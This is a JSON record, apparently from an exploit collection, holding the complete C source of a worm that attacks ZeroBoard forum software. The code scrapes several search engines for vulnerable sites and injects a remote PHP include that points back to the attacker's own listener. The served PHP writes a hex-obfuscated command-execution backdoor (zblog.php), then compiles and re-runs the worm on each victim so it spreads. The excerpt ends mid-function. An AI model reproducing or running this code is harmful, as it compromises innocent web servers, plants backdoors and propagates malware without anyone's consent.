{
  "id": "982",
  "title": "ZeroBoard - Worm Source Code",
  "cve": null,
  "vuln_type": "rce",
  "code": "/* \r\nThe worm exploits a vulnerability in ZeroBoard, allowing an attacker to inject arbitrary PHP code. \r\n\r\n/str0ke\r\n*/\r\n\r\n/*\r\n** ZeroBoard -1day INE w0rm\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <unistd.h>\r\n#include <stdlib.h>\r\n#include <sys/socket.h>\r\n#include <netdb.h>\r\n#include <netinet/in.h>\r\n#include <signal.h>\r\n#include <sys/ioctl.h>\r\n#include <net/if.h>\r\n#ifdef __sun__\r\n#include <sys/sockio.h>\r\n#endif /* __SunOS__ */\r\n\r\n#define DEBUG_ING\r\n#undef DEBUG_ING\r\n\r\n#define TMP_FILE \"./tmp.core\"\r\n#define CMD_FILE \"./cmd.core\"\r\n#define PRC_FILE \"./proc.core\"\r\n#define SCS (0)\r\n#define MIN (1)\r\n\r\n#ifdef __linux__\r\n#define DEF_ETH \"eth0\"\r\n#else\r\n#ifdef __FreeBSD__\r\n#define DEF_ETH \"ed0\"\r\n#else\r\n#ifdef __sun__\r\n#define DEF_ETH \"hme0\"\r\n#endif\r\n#endif\r\n#endif\r\n\r\n#define MAX_BUF (0x0000ffff)\r\n#define FIR_BUF (0x00000800)\r\n#define SEC_BUF (0x00000400)\r\n#define THR_BUF (0x00000200)\r\n#define MIN_BUF (0x00000100)\r\n\r\n#define VENDOR \"nzeo.com\"\r\n\r\n// search rule\r\n#define FD_RULE_0 \"/zboard/zboard.php\"\r\n#define FD_RULE_1 \"/zb41/zboard.php\"\r\n#define FD_RULE_2 \"/bbs/zboard.php\"\r\n#define FD_RULE_3 \"/zb/zboard.php\"\r\n#define FD_RULE_4 \"/zb40/zboard.php\"\r\n#define FD_RULE_5 \"/board/zboard.php\"\r\n#define FD_RULE_6 \"zboard.php\"\r\n#define FD_RULE_7 \"zboard.ph\"\r\n\r\n// pattern\r\n#define FD_PATH_0 \"/zboard/skin/zero_vote/login.php\"\r\n#define FD_PATH_1 \"/zb41/skin/zero_vote/login.php\"\r\n#define FD_PATH_2 \"/bbs/skin/zero_vote/login.php\"\r\n#define FD_PATH_3 \"/zb/skin/zero_vote/login.php\"\r\n#define FD_PATH_4 \"/zb40/skin/zero_vote/login.php\"\r\n#define FD_PATH_5 \"/board/skin/zero_vote/login.php\"\r\n#define FD_PATH_6 \"/skin/zero_vote/login.php\"\r\n\r\n#define RESULT_OK \"200 OK\"\r\n#define MAKE_STR1 \"BACKDOOR MAKE SUCCESS\"\r\n#define MAKE_STR2 \"ZBCODE MAKE SUCCESS\"\r\n#define DELT_STR1 \"BACKDOOR DELETE SUCCESS\"\r\n#define DELT_STR2 \"ZBCODE DELETE SUCCESS\"\r\n\r\n#define DEF_PORT (31337)\r\n#define CONN_PORT (80)\r\n#define DEF_TIME (20)\r\n\r\nint set_sock(char *sc_gt_host,int port,int type);\r\nvoid re_connt_lm(int st_sock_va,int type);\r\nint proc_r();\r\nvoid t_kill();\r\nvoid sf_exit();\r\nint g_ip(char *ip);\r\nint make_cmd_file();\r\nint filter_f(char *test_bf,int tnum);\r\n\r\nint sock;\r\n\r\nstruct tg_rl\r\n{\r\n int r_num;\r\n char *r_str;\r\n char *url_str;\r\n};\r\n\r\n#define TARGET_NUM (7)\r\n#define SEARCH_NUM (4)\r\n\r\nstruct tg_rl __tg_rule_va[]=\r\n{\r\n {0,FD_RULE_0,FD_PATH_0},\r\n {1,FD_RULE_1,FD_PATH_1},\r\n {2,FD_RULE_2,FD_PATH_2},\r\n {3,FD_RULE_3,FD_PATH_3},\r\n {4,FD_RULE_4,FD_PATH_4},\r\n {5,FD_RULE_5,FD_PATH_5},\r\n {6,FD_RULE_6,FD_PATH_6},\r\n {7,FD_RULE_7,FD_PATH_6},\r\n {8,NULL,NULL}\r\n};\r\n\r\nstruct search_rule\r\n{\r\n int num;\r\n u_char *url;\r\n int maxnum;\r\n int defnum;\r\n u_char *http_head;\r\n};\r\n\r\nstruct search_rule search_va[]=\r\n{\r\n {0,\"www.google.com\",990,10,\"http://\"},\r\n {1,\"kr.search.yahoo.com\",990,15,\"http://\"},\r\n {2,\"search.nate.com\",480,10,\"http://\"},\r\n {3,\"search.lycos.com\",990,10,\"//\"},\r\n {4,\"kr.altavista.com\",1000,10,\"//\"},\r\n {5,NULL,0,0,NULL}\r\n};\r\n\r\nvoid t_kill()\r\n{\r\n#ifdef DEBUG_ING\r\n fprintf(stdout,\"time out\\n\");\r\n#endif\r\n close(sock);\r\n sock=-1;\r\n signal(SIGALRM,SIG_DFL);\r\n return;\r\n}\r\n\r\nvoid sf_exit()\r\n{\r\n#ifdef DEBUG_ING\r\n fprintf(stdout,\"safe exit\\n\");\r\n#endif\r\n close(sock);\r\n kill((int)proc_r(),9);\r\n unlink(TMP_FILE);\r\n unlink(CMD_FILE);\r\n unlink(PRC_FILE);\r\n exit(-1);\r\n}\r\n\r\nint main(int argc,char *argv[])\r\n{\r\n FILE *fp;\r\n\r\n int tnum=(SCS);\r\n int chk=(SCS);\r\n int gogo=(SCS);\r\n int whgl=(SCS);\r\n int qnum=(SCS);\r\n int tgrl_sl=(MIN);\r\n int _conn_num=(SCS);\r\n int port=(CONN_PORT);\r\n int def_port=(DEF_PORT);\r\n int sc_gt_sock;\r\n int host_chk=(SCS);\r\n\r\n u_char *gg_ptr=NULL;\r\n u_char *t_ptr=NULL;\r\n u_char __zr_bf[(MAX_BUF)];\r\n u_char *port_ptr=NULL;\r\n\r\n char pkt[(FIR_BUF)];\r\n char host[(SEC_BUF)];\r\n char url[(SEC_BUF)];\r\n char test_bf[(MAX_BUF)];\r\n char req_t_bf[(THR_BUF)];\r\n char ip[(MIN_BUF)];\r\n char atk_code[(MIN_BUF)];\r\n\r\n signal(SIGINT,sf_exit);\r\n signal(SIGTSTP,sf_exit);\r\n\r\n while((whgl=getopt(argc,argv,\"S:s:T:t:Q:q:P:p:H:h:U:u:\"))!=EOF)\r\n {\r\n  extern char *optarg;\r\n  switch(whgl)\r\n  {\r\n   case 'S':\r\n   case 's':\r\n    tnum=atoi(optarg);\r\n    if(SEARCH_NUM<tnum)\r\n    {\r\n     fprintf(stderr,\"target error\\n\");\r\n     exit(-1);\r\n    }\r\n    break;\r\n\r\n   case 'T':\r\n   case 't':\r\n    tgrl_sl=atoi(optarg);\r\n    if(TARGET_NUM<tgrl_sl)\r\n    {\r\n     fprintf(stderr,\"target error\\n\");\r\n     exit(-1);\r\n    }\r\n    break;\r\n\r\n   case 'Q':\r\n   case 'q':\r\n    qnum=atoi(optarg);\r\n    break;\r\n    \r\n   case 'P':\r\n   case 'p':\r\n    def_port=atoi(optarg);\r\n    break;\r\n    \r\n   case 'H':\r\n   case 'h':\r\n    memset((char *)host,0,sizeof(host));\r\n    strncpy(host,optarg,sizeof(host)-1);\r\n    host_chk++;\r\n    break;\r\n    \r\n   case 'U':\r\n   case 'u':\r\n    memset((char *)url,0,sizeof(url));\r\n    strncpy(url,optarg,sizeof(url)-1);\r\n    host_chk++;\r\n    break;\r\n    \r\n   default:\r\n    exit(-1);\r\n  }\r\n }\r\n\r\n (int)make_cmd_file();\r\n\r\n if(fork()==0)\r\n {\r\n  signal(SIGALRM,SIG_IGN);\r\n  for(whgl=0;whgl<argc;whgl++)\r\n  {\r\n   memset((char *)argv[whgl],0,strlen(argv[whgl]));\r\n  }\r\n  strcpy(argv[0],\"receive mode process\");\r\n  if((fp=fopen(PRC_FILE,\"w\"))==NULL)\r\n  {\r\n   sf_exit();\r\n  }\r\n  fprintf(fp,\"%d\\n\",getpid());\r\n  fclose(fp);\r\n  sc_gt_sock=(int)set_sock(NULL,def_port,1);\r\n  (void)re_connt_lm(sc_gt_sock,0);\r\n }\r\n else\r\n {\r\n  for(whgl=0;whgl<argc;whgl++)\r\n  {\r\n   memset((char *)argv[whgl],0,strlen(argv[whgl]));\r\n  }\r\n  strcpy(argv[0],\"scanning mode process\");\r\n\r\n  switch(host_chk)\r\n  {\r\n   case 1:\r\n#ifdef DEBUG_ING\r\n    fprintf(stdout,\"argument error\\n\");\r\n#endif\r\n    sf_exit();\r\n    break;\r\n    \r\n   case 2:\r\n    goto ok;\r\n    break;\r\n  }\r\n\r\n#ifdef DEBUG_ING\r\n  fprintf(stdout,\"search url: %s\\n\",search_va[tnum].url);\r\n#endif\r\n  for(_conn_num=qnum; _conn_num< search_va[tnum].maxnum; _conn_num += (search_va[tnum].defnum))\r\n  {\r\nconn: if((sock=(int)set_sock(search_va[tnum].url,(CONN_PORT),0))==-1)\r\n   {\r\n    goto conn;\r\n   }\r\n\r\n   memset((char *)req_t_bf,0,sizeof(req_t_bf));\r\n   switch(search_va[tnum].num)\r\n   {\r\n    case 0:\r\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\r\n      \"GET /search?q=%s\"\r\n      \"&hl=ko&lr=&ie=UTF-8&start=%d&sa=N \"\r\n      \"HTTP/1.0\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num);\r\n     break;\r\n    case 1:\r\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\r\n      \"GET /search/web?p=%s&b=%d \"\r\n      \"HTTP/1.0\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num);\r\n     break;\r\n    case 2:\r\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\r\n      \"GET /webpage/search.asp?query=%s&start=%d \"\r\n      \"HTTP/1.0\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num);\r\n     break;\r\n    case 3:\r\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\r\n      \"GET /default.asp?query=%s&first=%d&pmore=more \"\r\n      \"HTTP/1.0\\r\\n\"\r\n      \"Accept-Language: ko\\r\\n\"\r\n      \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\\r\\n\"\r\n      \"Host: %s\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num,search_va[tnum].url);\r\n     break;\r\n    case 4:\r\n     snprintf(req_t_bf,sizeof(req_t_bf)-1,\r\n      \"GET /web/results?itag=wrx&q=%s&stq=%d \"\r\n      \"HTTP/1.0\\r\\n\"\r\n      \"Accept-Language: ko\\r\\n\"\r\n      \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\\r\\n\"\r\n      \"Host: %s\\r\\n\\r\\n\",(__tg_rule_va[tgrl_sl].r_str),_conn_num,search_va[tnum].url);\r\n     break;\r\n   }\r\n   send(sock,req_t_bf,strlen(req_t_bf),0);\r\n   whgl=(SCS);\r\n\r\n   if((fp=fopen(TMP_FILE,\"w\"))==NULL)\r\n   {\r\n    return(-1);\r\n   }\r\n   signal(SIGALRM,SIG_IGN);\r\n   alarm(MAX_BUF);\r\n   \r\n   memset((char *)test_bf,0,sizeof(test_bf));\r\n   while(recv(sock,test_bf,sizeof(test_bf)-1,0))\r\n   {\r\n    fprintf(fp,\"%s\",test_bf);\r\n    memset((char *)test_bf,0,sizeof(test_bf));\r\n   }\r\n   fclose(fp);\r\n   close(sock);\r\n\r\n   if((fp=fopen(TMP_FILE,\"r\"))==NULL)\r\n   {\r\n    return(-1);\r\n   }\r\n\r\n   while(fgets(__zr_bf,sizeof(__zr_bf)-1,fp))\r\n   {\r\n    gg_ptr=__zr_bf;\r\n\r\n    while(MIN)\r\n    {\r\n     t_ptr=(char *)strstr(gg_ptr,search_va[tnum].http_head);\r\n     gg_ptr=(char *)strstr(gg_ptr,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);\r\n\r\n     if(t_ptr!=NULL)\r\n     {\r\n      memset((char *)test_bf,0,sizeof(test_bf));\r\n      whgl=(SCS);\r\n      chk=(SCS);\r\n\r\n      for(gogo=0;gogo<strlen(t_ptr);gogo++)\r\n      {\r\n       if(chk)\r\n       {\r\n        if(t_ptr[gogo]=='>')\r\n         chk=0;\r\n       }\r\n       else {\r\n        if(t_ptr[gogo]==' ')\r\n         continue;\r\n        else if(t_ptr[gogo]=='<')\r\n         chk=1;\r\n        else test_bf[whgl++]=t_ptr[gogo];\r\n       }\r\n      }\r\n\r\n      if(!strstr(test_bf,__tg_rule_va[tgrl_sl].r_str))\r\n       continue;\r\n      else t_ptr=(char *)strstr(test_bf,__tg_rule_va[tgrl_sl].r_str);\r\n\r\n      if(t_ptr!=NULL)\r\n       t_ptr[0]='\\0';\r\n      else continue;\r\n\r\n      if(filter_f(test_bf,tnum))\r\n      {\r\n       t_ptr=(char *)strstr(test_bf,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);\r\n       if(strstr(t_ptr,search_va[tnum].http_head))\r\n        continue;\r\n\r\n       memset((char *)host,0,sizeof(host));\r\n       memset((char *)url,0,sizeof(url));\r\n\r\n       chk=(SCS);\r\n\r\n       if(strstr(test_bf,search_va[tnum].http_head))\r\n       {\r\n        t_ptr=(char *)strstr(test_bf,search_va[tnum].http_head) + strlen(search_va[tnum].http_head);\r\n        port=(CONN_PORT);\r\n\r\n        for(whgl=0;whgl<strlen(t_ptr)+1;whgl++)\r\n        {\r\n         if(t_ptr[whgl]=='/')\r\n         {\r\n          for(gogo=0;whgl<strlen(t_ptr);whgl++)\r\n           url[gogo++]=t_ptr[whgl];\r\n          strcat(url,__tg_rule_va[tgrl_sl].url_str);\r\n          break;\r\n         }\r\n         else if(t_ptr[whgl]=='\\0')\r\n         {\r\n          strncpy(url,__tg_rule_va[tgrl_sl].url_str,sizeof(url)-1);\r\n          break;\r\n         }\r\n         else if(t_ptr[whgl]==':')\r\n         {\r\n          port_ptr=(char *)strstr(t_ptr,\":\")+1;\r\n          port=atoi(port_ptr);\r\n         }\r\n         else host[chk++]=t_ptr[whgl];\r\n        }\r\n#ifdef DEBUG_ING\r\n        fprintf(stdout,\"Total:%s,URL:%s,HOST:%s,PORT:%d\\n\",test_bf,url,host,port);\r\n#endif\r\nok:\r\n        sock=set_sock(host,port,0);\r\n        if(sock==-1)\r\n         continue;\r\n        else {\r\n         memset((char *)ip,0,sizeof(ip));\r\n         memset((char *)atk_code,0,sizeof(atk_code));\r\n         memset((char *)pkt,0,sizeof(pkt));\r\n\r\n         (int)g_ip(ip);\r\n         snprintf(atk_code,sizeof(atk_code)-1,\"dir=http://%s:%d/\\r\\n\",ip,def_port);\r\n         snprintf(pkt,sizeof(pkt)-1,\r\n          \"POST http://%s%s HTTP/1.0\\r\\n\"\r\n          \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\r\n          \"Content-Length: %d\\r\\n\"\r\n          \"Host: %s\\r\\n\\r\\n%s\\r\\n\",host,url,strlen(atk_code),host,atk_code);\r\n         send(sock,pkt,strlen(pkt),0);\r\n         memset((char *)pkt,0,sizeof(pkt));\r\n         recv(sock,pkt,sizeof(pkt)-1,0);\r\n#ifdef DEBUG_ING\r\n         if(strstr(pkt,RESULT_OK))\r\n         {\r\n          if(strstr(pkt,MAKE_STR1))\r\n           fprintf(stdout,\"%s\\n\",MAKE_STR1);\r\n          if(strstr(pkt,MAKE_STR2))\r\n           fprintf(stdout,\"%s\\n\",MAKE_STR2);\r\n          if(strstr(pkt,DELT_STR1))\r\n           fprintf(stdout,\"%s\\n\",DELT_STR1);\r\n          if(strstr(pkt,DELT_STR2))\r\n           fprintf(stdout,\"%s\\n\",DELT_STR2);\r\n          printf(\"%s: %s\\n\",RESULT_OK,host);\r\n         }\r\n#endif\r\n        }\r\n        close(sock);\r\n\r\n        if(host_chk)\r\n        {\r\n         sf_exit();\r\n        }\r\n       }\r\n      }\r\n     }\r\n     else break;\r\n    }\r\n    memset((char *)__zr_bf,0,sizeof(__zr_bf));\r\n   }\r\n   fclose(fp);\r\n   unlink(TMP_FILE);\r\n  }\r\n  sf_exit();\r\n }\r\n}\r\n\r\nint set_sock(char *sc_gt_host,int port,int type)\r\n{\r\n struct sockaddr_in sock_st;\r\n struct sockaddr_in t_st;\r\n int nw_gt_sock,s_s;\r\n struct hostent *hst_etr;\r\n int sc_gt_sock;\r\n int t_c=0;\r\n char t_b[(SEC_BUF)];\r\n FILE *fp;\r\n char http_rq[]=\"HTTP/1.1 200 OK\\r\\n\\r\\n\";\r\n\r\n if(!type){\r\n  signal(SIGALRM,t_kill);\r\n  alarm(DEF_TIME);\r\n\r\n  if((hst_etr=gethostbyname(sc_gt_host))==NULL)\r\n  {\r\n   return(-1);\r\n  }\r\n  if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)\r\n  {\r\n   return(-1);\r\n  }\r\n  sock_st.sin_family=(AF_INET);\r\n  sock_st.sin_port=htons(port);\r\n  sock_st.sin_addr=*((struct in_addr *)hst_etr->h_addr);\r\n  memset(&(sock_st.sin_zero),0,8);\r\n\r\n  if(connect(sock,(struct sockaddr *)&sock_st,sizeof(struct sockaddr))==-1)\r\n  {\r\n   close(sock);\r\n   return(-1);\r\n  }\r\n  return(sock);\r\n }\r\n else{\r\n  if((sc_gt_sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)\r\n  {\r\n   return(-1);\r\n  }\r\n\r\n  sock_st.sin_family=(AF_INET);\r\n  sock_st.sin_port=htons(port);\r\n  sock_st.sin_addr.s_addr=(INADDR_ANY);\r\n  memset(&(sock_st.sin_zero),0,8);\r\n\r\n  if(bind(sc_gt_sock,(struct sockaddr *)&sock_st,sizeof(struct sockaddr))==-1)\r\n  {\r\n   close(sc_gt_sock);\r\n   return(-1);\r\n  }\r\n#define BK_LG 10\r\n  if(listen(sc_gt_sock,(BK_LG))==-1){\r\n   close(sc_gt_sock);\r\n   return(-1);\r\n  }\r\n  while(1){\r\n   s_s=sizeof(struct sockaddr_in);\r\n   if((nw_gt_sock=accept(sc_gt_sock,(struct sockaddr *)&t_st,&s_s))==-1)\r\n   {\r\n    close(nw_gt_sock);\r\n    close(sc_gt_sock);\r\n    return(-1);\r\n   }\r\n   while(recv(nw_gt_sock,&t_c,1,0)){\r\n    if(t_c==0x0d){\r\n     recv(nw_gt_sock,&t_c,1,0);\r\n     if(t_c==0x0a){\r\n      recv(nw_gt_sock,&t_c,1,0);\r\n      if(t_c==0x0d){\r\n       recv(nw_gt_sock,&t_c,1,0);\r\n       if(t_c==0x0a){\r\n        break;\r\n       }\r\n      }\r\n     }\r\n    }\r\n   }\r\n\r\n   send(nw_gt_sock,http_rq,strlen(http_rq),0);\r\n   if((fp=fopen(CMD_FILE,\"r\"))==NULL){\r\n    close(nw_gt_sock);\r\n    close(sc_gt_sock);\r\n    return(-1);\r\n   }\r\n   memset((char *)t_b,0,sizeof(t_b));\r\n   while(fgets(t_b,sizeof(t_b)-1,fp)){\r\n    send(nw_gt_sock,t_b,strlen(t_b),0);\r\n   }\r\n   fclose(fp);\r\n   close(nw_gt_sock);\r\n   continue;\r\n  }\r\n  close(sc_gt_sock);\r\n  return(-1);\r\n }\r\n}\r\n\r\nvoid re_connt_lm(int st_sock_va,int type)\r\n{\r\n if(st_sock_va==-1)\r\n {\r\n  if(!type){\r\n   kill(getppid(),9); // parent\r\n  }\r\n  kill((int)proc_r(),9); // child\r\n  sf_exit();\r\n }\r\n}\r\n\r\nint proc_r(){\r\n FILE *fp;\r\n int proc_n;\r\n if((fp=fopen(PRC_FILE,\"r\"))==NULL){\r\n  exit(-1); // child check.\r\n }\r\n fscanf(fp,\"%16d\",&proc_n);\r\n fclose(fp);\r\n return proc_n;\r\n}\r\n\r\nint g_ip(char *ip)\r\n{\r\n int sock;\r\n struct ifreq ifpq;\r\n struct sockaddr_in *pq;\r\n\r\n memset(&ifpq,0,sizeof(ifpq));\r\n if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)\r\n {\r\n  return(-1);\r\n }\r\n pq=(struct sockaddr_in *)&ifpq.ifr_addr;\r\n pq->sin_family=AF_INET;\r\n \r\n memcpy(ifpq.ifr_name,(DEF_ETH),sizeof(ifpq.ifr_name));\r\n if(ioctl(sock,SIOCGIFADDR,&ifpq)==0)\r\n {\r\n  memset((char *)ip,0,(MIN_BUF));\r\n  snprintf(ip,(MIN_BUF)-1,\"%s\",inet_ntoa(pq->sin_addr));\r\n }\r\n return 0;\r\n}\r\n\r\n#define BACKDOOR_PATH \"zblog.php\"\r\n#define CODE_PATH \"zbcode\"\r\n#define CODE_PATH_SRC \"zbcode.c\"\r\n\r\nint make_cmd_file()\r\n{\r\n unsigned long w1=0;\r\n FILE *fp;\r\n FILE *pf;\r\n \r\n if((fp=fopen(CMD_FILE,\"w\"))==NULL)\r\n {\r\n  return(-1);\r\n }\r\n \r\n fprintf(fp,\"<?\\n\"\r\n  \"chdir('../../');\\n\\n\"\r\n  \"if(($fp=fopen('%s','r'))!=NULL)\\n\"\r\n  \"{\\n\"\r\n  \"$pnum=fread($fp,32);\\n\"\r\n  \"fclose($fp);\\n\"\r\n  \"$pnum=str_replace(\\\"\\\\n\\\",\\\"\\\",$pnum);\\n\"\r\n  \"if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\\n\"\r\n  \"{\\n\"\r\n  \"exit;\\n\"\r\n  \"}\\n\"\r\n  \"}\\n\\n\"\r\n  \"$cont=\\\"\\\\x3c\\\\x3f\\\\x0a\\\\x09\\\\x65\\\\x63\\\\x68\\\\x6f\\\\x20\\\\x27\\\\x3c\\\\x46\\\".\\n\"\r\n  \"\\\"\\\\x4f\\\\x52\\\\x4d\\\\x20\\\\x41\\\\x43\\\\x54\\\\x49\\\\x4f\\\\x4e\\\\x3d\\\\x24\\\".\\n\"\r\n  \"\\\"\\\\x50\\\\x48\\\\x50\\\\x5f\\\\x53\\\\x45\\\\x4c\\\\x46\\\\x20\\\\x4d\\\\x45\\\\x54\\\".\\n\"\r\n  \"\\\"\\\\x48\\\\x4f\\\\x44\\\\x3d\\\\x50\\\\x4f\\\\x53\\\\x54\\\\x3e\\\\x27\\\\x3b\\\\x0a\\\".\\n\"\r\n  \"\\\"\\\\x09\\\\x65\\\\x63\\\\x68\\\\x6f\\\\x20\\\\x27\\\\x3c\\\\x49\\\\x4e\\\\x50\\\\x55\\\".\\n\"\r\n  \"\\\"\\\\x54\\\\x20\\\\x54\\\\x59\\\\x50\\\\x45\\\\x3d\\\\x48\\\\x49\\\\x44\\\\x44\\\\x45\\\".\\n\"\r\n  \"\\\"\\\\x4e\\\\x20\\\\x4e\\\\x41\\\\x4d\\\\x45\\\\x3d\\\\x63\\\\x6d\\\\x64\\\\x20\\\\x56\\\".\\n\"\r\n  \"\\\"\\\\x41\\\\x4c\\\\x55\\\\x45\\\\x3d\\\\x24\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\\x6e\\\".\\n\"\r\n  \"\\\"\\\\x64\\\\x3e\\\\x3c\\\\x2f\\\\x46\\\\x4f\\\\x52\\\\x4d\\\\x3e\\\\x3c\\\\x50\\\\x52\\\".\\n\"\r\n  \"\\\"\\\\x45\\\\x3e\\\\x27\\\\x3b\\\\x0a\\\\x09\\\\x24\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\".\\n\"\r\n  \"\\\"\\\\x6e\\\\x64\\\\x3d\\\\x73\\\\x74\\\\x72\\\\x5f\\\\x72\\\\x65\\\\x70\\\\x6c\\\\x61\\\".\\n\"\r\n  \"\\\"\\\\x63\\\\x65\\\\x28\\\\x27\\\\x5c\\\\x5c\\\\x27\\\\x2c\\\\x27\\\\x27\\\\x2c\\\\x24\\\".\\n\"\r\n  \"\\\"\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\\x6e\\\\x64\\\\x29\\\\x3b\\\\x0a\\\\x09\\\\x65\\\".\\n\"\r\n  \"\\\"\\\\x63\\\\x68\\\\x6f\\\\x20\\\\x60\\\\x24\\\\x63\\\\x6f\\\\x6d\\\\x6d\\\\x61\\\\x6e\\\".\\n\"\r\n  \"\\\"\\\\x64\\\\x60\\\\x3b\\\\x0a\\\\x3f\\\\x3e\\\\x0a\\\";\\n\\n\"\r\n  \"$fp=fopen('%s','w');\\n\"\r\n  \"fputs($fp,$cont);\\n\"\r\n  \"fclose($fp);\\n\\n\",PRC_FILE,BACKDOOR_PATH);\r\n\r\n if((pf=fopen(CODE_PATH,\"r\"))==NULL)\r\n {\r\n  return(-1);\r\n }\r\n \r\n fprintf(fp,\"$cont=\\\"\");\r\n while(fread(&w1,1,1,pf))\r\n {\r\n  fprintf(fp,\"\\\\x%02x\",w1);\r\n }\r\n fclose(pf);\r\n fprintf(fp,\"\\\";\\n\\n\");\r\n \r\n fprintf(fp,\"$fp=fopen('%s','w');\\n\"\r\n  \"fputs($fp,$cont);\\n\"\r\n  \"fclose($fp);\\n\\n\",CODE_PATH);\r\n if((pf=fopen(CODE_PATH_SRC,\"r\"))==NULL)\r\n {\r\n  return(-1);\r\n }\r\n fprintf(fp,\"$cont=\\\"\");\r\n while(fread(&w1,1,1,pf))\r\n {\r\n  fprintf(fp,\"\\\\x%02x\",w1);\r\n }\r\n fclose(pf);\r\n fprintf(fp,\"\\\";\\n\\n\");\r\n \r\n fprintf(fp,\"$fp=fopen('%s','w');\\n\"\r\n  \"fputs($fp,$cont);\\n\"\r\n  \"fclose($fp);\\n\\n\",CODE_PATH_SRC);\r\n fprintf(fp,\"$RES=`gcc -o %s %s`;\\n\\n\",CODE_PATH,CODE_PATH_SRC);\r\n\r\n fprintf(fp,\"chmod('%s',0755);\\n\",CODE_PATH);\r\n\r\n fprintf(fp,\"if(($fp=fopen('%s','r'))!=NULL){\\n\",BACKDOOR_PATH);\r\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",MAKE_STR1);\r\n fprintf(fp,\"} fclose($fp);\\n\\n\");\r\n fprintf(fp,\"if(($fp=fopen('%s','r'))!=NULL){\\n\",CODE_PATH);\r\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",MAKE_STR2);\r\n fprintf(fp,\"} fclose($fp);\\n\\n\");\r\n\r\n#if 1\r\n fprintf(fp,\"$fnum=(rand()%%%d);\\n\",TARGET_NUM);\r\n fprintf(fp,\"$snum=(rand()%%%d);\\n\",SEARCH_NUM);\r\n fprintf(fp,\"$randnum=(rand()%400);\\n\");\r\n \r\n fprintf(fp,\"while(1)\\n{\\n\");\r\n fprintf(fp,\"if(($fp=fopen('%s','r'))!=NULL)\\n\"\r\n  \"{\\n\"\r\n  \"$pnum=fread($fp,32);\\n\"\r\n  \"fclose($fp);\\n\"\r\n  \"$pnum=str_replace(\\\"\\\\n\\\",\\\"\\\",$pnum);\\n\"\r\n  \"if(($fp=fopen('/proc/'.$pnum.'/stat','r'))!=NULL)\\n\"\r\n  \"{\\n\"\r\n  \"exit;\\n\"\r\n  \"}\\n\"\r\n  \"}\\n\\n\",PRC_FILE);\r\n\r\n fprintf(fp,\"$port=(rand()%%65500);\\n\");\r\n fprintf(fp,\"if($port>1024){\\n\");\r\n fprintf(fp,\"exec(\\\"./%s -t $fnum -p $port -s $snum -q $randnum\\\");\\n\",CODE_PATH);\r\n fprintf(fp,\"}\\n}\\n\");\r\n#else\r\n fprintf(fp,\"unlink('%s');\\n\",BACKDOOR_PATH);\r\n fprintf(fp,\"unlink('%s');\\n\",CODE_PATH);\r\n\r\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",BACKDOOR_PATH);\r\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR1);\r\n fprintf(fp,\"} else { fclose($fp);\\n\");\r\n fprintf(fp,\"$result=`rm -f %s`;\\n$result=`del %s`;\\n\",BACKDOOR_PATH,BACKDOOR_PATH);\r\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",BACKDOOR_PATH);\r\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR1);\r\n fprintf(fp,\"}\\n}\\n\");\r\n\r\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",CODE_PATH);\r\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR2);\r\n fprintf(fp,\"} else { fclose($fp);\\n\");\r\n fprintf(fp,\"$result=`rm -f %s`;\\n$result=`del %s`;\\n\",CODE_PATH,CODE_PATH);\r\n fprintf(fp,\"if(($fp=fopen('%s','r'))==NULL){\\n\",CODE_PATH);\r\n fprintf(fp,\"echo \\\"%s\\\\n\\\";\\n\",DELT_STR2);\r\n fprintf(fp,\"}\\n}\\n\");\r\n#endif\r\n fprintf(fp,\"?>\\n\");\r\n fclose(fp);\r\n}\r\n\r\nint filter_f(char *test_bf,int tnum)\r\n{\r\n switch(search_va[tnum].num)\r\n {\r\n  case 0: /* google */\r\n   if(!strstr(test_bf,\"google\")&&!strstr(test_bf,\"/search?q=cache:\")\r\n    &&!strstr(test_bf,\"<\")&&!strstr(test_bf,\">\")\r\n    &&!strstr(test_bf,\"%3F\")&&!strstr(test_bf,\"...\")\r\n    &&!strstr(test_bf,VENDOR))\r\n   {\r\n    return 1;\r\n   }\r\n   else return 0;\r\n   break;\r\n   \r\n  case 1: /* yahoo */\r\n   if(!strstr(test_bf,\"yahoo\")&&!strstr(test_bf,\"/cache.php?\")\r\n    &&!strstr(test_bf,\"<\")&&!strstr(test_bf,\">\")\r\n    &&!strstr(test_bf,\"search\")&&!strstr(test_bf,\".html%\")\r\n    &&!strstr(test_bf,\"...\")&&!strstr(test_bf,VENDOR))\r\n   {\r\n    return 1;\r\n   }\r\n   else return 0;\r\n   break;\r\n   \r\n  case 2: /* nate */\r\n   if(!strstr(test_bf,\"nate\")&&!strstr(test_bf,\"RESULT\")\r\n    &&!strstr(test_bf,\"<\")&&!strstr(test_bf,\">\")\r\n    